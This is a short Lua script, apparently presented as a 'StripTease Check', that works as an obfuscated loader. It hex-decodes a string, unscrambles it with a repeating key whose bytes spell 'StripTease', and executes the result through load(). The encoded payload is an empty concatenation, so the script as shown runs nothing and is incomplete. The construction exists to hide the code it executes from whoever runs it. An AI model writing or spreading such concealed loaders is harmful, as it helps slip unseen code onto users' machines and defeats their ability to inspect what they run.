local K={83,116,114,105,112,84,101,97,115,101}
local H=""..""..""..""..""..""..""..""..""..""..""..""..""..""..""..""
local S=(H:gsub("%x%x",function(h) return string.char(tonumber(h,16)) end))
local T,N={},#K
for i=1,#S do T[i]=string.char((string.byte(S,i)-K[(i-1)%N+1])%256) end
load(table.concat(T),"@StripTease Check.lua")()
